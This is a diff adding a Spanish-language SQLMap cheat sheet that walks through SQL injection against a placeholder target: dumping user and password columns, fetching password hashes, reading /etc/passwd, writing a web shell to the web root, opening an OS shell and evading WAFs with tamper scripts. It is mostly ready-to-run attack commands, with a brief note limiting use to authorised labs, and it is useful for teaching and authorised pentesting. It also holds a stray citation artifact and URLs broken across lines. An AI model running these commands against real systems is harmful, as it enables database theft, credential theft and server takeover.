@@ -1,0 +1,347 @@
+# 🗄️ Cheat Sheet Completo de SQLMap
+
+SQLMap es una herramienta automática para **detectar y explotar vulnerabilidades de SQL Injection** en aplicaciones web.
+
+Permite:
+
+- detectar SQL Injection
+- extraer bases de datos
+- obtener tablas
+- obtener columnas
+- extraer datos
+- ejecutar comandos en el sistema (en algunos casos)
+- leer archivos del servidor
+
+⚠️ Usar solo en **laboratorios o entornos autorizados**.
+
+---
+
+# 1️⃣ Uso básico
+
+Escanear una URL para detectar SQL Injection.
+
+
+sqlmap -u "http://target/page.php?id=1
+"
+
+
+SQLMap probará automáticamente diferentes tipos de inyección.
+
+---
+
+# 2️⃣ Aumentar nivel de pruebas
+
+SQLMap tiene niveles de agresividad.
+
+
+sqlmap -u "http://target/page.php?id=1
+" --level=5 --risk=3
+
+
+| opción | función |
+|------|------|
+| --level | cantidad de parámetros probados |
+| --risk | agresividad de pruebas |
+
+---
+
+# 3️⃣ Escaneo de parámetros GET
+
+Ejemplo clásico:
+
+
+sqlmap -u "http://target/product.php?id=1
+"
+
+
+SQLMap detectará si el parámetro `id` es vulnerable.
+
+---
+
+# 4️⃣ Escaneo de formularios POST
+
+
+sqlmap -u http://target/login.php
+ --data="user=admin&pass=test"
+
+
+ SQLMap probará SQL Injection en esos parámetros.
+
+ ---
+
+ # 5️⃣ Usar proxy (Burp)
+
+ Muy común en pentesting.
+
+ Con **:contentReference[oaicite:1]{index=1}**:
+
+
+ sqlmap -u "http://target/page.php?id=1
+ " --proxy="http://127.0.0.1:8080
+ "
+
+
+ ---
+
+ # 6️⃣ Escanear request capturada
+
+ Guardar request en archivo `request.txt`.
+
+ Ejecutar:
+
+
+ sqlmap -r request.txt
+
+
+ Esto replica exactamente la petición del navegador.
+
+ ---
+
+ # 7️⃣ Enumerar bases de datos
+
+ Si SQLMap detecta vulnerabilidad:
+
+
+ sqlmap -u "http://target/page.php?id=1
+ " --dbs
+
+
+ Mostrará todas las bases de datos.
+
+ ---
+
+ # 8️⃣ Enumerar tablas
+
+
+ sqlmap -u "http://target/page.php?id=1
+ " -D database_name --tables
+
+
+ ---
+
+ # 9️⃣ Enumerar columnas
+
+
+ sqlmap -u "http://target/page.php?id=1
+ " -D database_name -T table_name --columns
+
+
+ ---
+
+ # 🔟 Extraer datos
+
+
+ sqlmap -u "http://target/page.php?id=1
+ " -D database_name -T table_name -C username,password --dump
+
+
+ Esto extraerá datos de esas columnas.
+
+ ---
+
+ # 1️⃣1️⃣ Extraer toda la base de datos
+
+
+ sqlmap -u "http://target/page.php?id=1
+ " -D database_name --dump
+
+
+ ---
+
+ # 1️⃣2️⃣ Detectar tipo de base de datos
+
+
+ sqlmap -u "http://target/page.php?id=1
+ " --banner
+
+
+ Esto muestra:
+
+ - MySQL
+ - PostgreSQL
+ - Oracle
+ - MSSQL
+ - SQLite
+
+ ---
+
+ # 1️⃣3️⃣ Obtener usuarios del DBMS
+
+
+ sqlmap -u "http://target/page.php?id=1
+ " --users
+
+
+ ---
+
+ # 1️⃣4️⃣ Obtener hashes de contraseñas
+
+
+ sqlmap -u "http://target/page.php?id=1
+ " --passwords
+
+
+ ---
+
+ # 1️⃣5️⃣ Leer archivos del servidor
+
+ Si el servidor lo permite:
+
+
+ sqlmap -u "http://target/page.php?id=1
+ " --file-read="/etc/passwd"
+
+
+ ---
+
+ # 1️⃣6️⃣ Escribir archivos en el servidor
+
+
+ sqlmap -u "http://target/page.php?id=1
+ " --file-write=shell.php --file-dest=/var/www/html/shell.php
+
+
+ ---
+
+ # 1️⃣7️⃣ Obtener shell del sistema
+
+ En algunos casos SQLMap puede ejecutar comandos.
+
+
+ sqlmap -u "http://target/page.php?id=1
+ " --os-shell
+
+
+ ---
+
+ # 1️⃣8️⃣ Ataques automáticos
+
+ Modo completamente automático:
+
+
+ sqlmap -u "http://target/page.php?id=1
+ " --batch --dbs
+
+
+ `--batch` evita preguntas interactivas.
+
+ ---
+
+ # 1️⃣9️⃣ Evadir WAF
+
+ SQLMap incluye técnicas de evasión.
+
+
+ sqlmap -u "http://target/page.php?id=1
+ " --tamper=space2comment
+
+
+ Ejemplos de tamper scripts:
+
+ | script | función |
+ |------|------|
+ | space2comment | reemplaza espacios |
+ | randomcase | mezcla mayúsculas |
+ | charencode | codifica caracteres |
+
+ ---
+
+ # 2️⃣0️⃣ Escaneo de cookies
+
+
+ sqlmap -u "http://target/page.php
+ " --cookie="PHPSESSID=1234"
+
+
+ ---
+
+ # 2️⃣1️⃣ Escaneo de headers
+
+
+ sqlmap -u "http://target/page.php
+ " --headers="X-Forwarded-For: 127.0.0.1"
+
+
+ ---
+
+ # 🔎 Flujo típico en pentesting web
+
+ 1️⃣ Descubrir endpoints
+
+ Usar **ffuf**
+
+
+ ffuf -u http://target/FUZZ
+  -w wordlist.txt
+
+
+  2️⃣ Encontrar parámetros
+
+
+  page.php?id=1
+
+
+  3️⃣ Probar SQL Injection
+
+
+  sqlmap -u "http://target/page.php?id=1
+  "
+
+
+  4️⃣ Enumerar bases de datos
+
+
+  sqlmap -u "http://target/page.php?id=1
+  " --dbs
+
+
+  5️⃣ Extraer tablas
+
+
+  sqlmap -u "http://target/page.php?id=1
+  " -D db --tables
+
+
+  6️⃣ Extraer credenciales
+
+
+  sqlmap -u "http://target/page.php?id=1
+  " -D db -T users --dump
+
+
+  ---
+
+  # 🧠 Consejos PRO
+
+  - usa proxy para analizar tráfico
+  - evita ataques muy agresivos en producción
+  - prueba primero manualmente con Burp
+  - usa `--batch` para automatizar
+
+  ---
+
+  # 📚 Herramientas que combinan bien con SQLMap
+
+  | herramienta | función |
+  |------|------|
+  | nmap | descubrir servicios |
+  | ffuf | encontrar endpoints |
+  | burp suite | analizar tráfico |
+  | nikto | vulnerabilidades web |
+
+  ---
+
+  # ⚡ Ejemplo real rápido
+
+
+  sqlmap -u "http://target/product.php?id=1
+  " --dbs
+
+  sqlmap -u "http://target/product.php?id=1
+  " -D shop --tables
+
+  sqlmap -u "http://target/product.php?id=1
+  " -D shop -T users --dump
+
+
+  Este es uno de los **flujos más usados en pentesting web**.
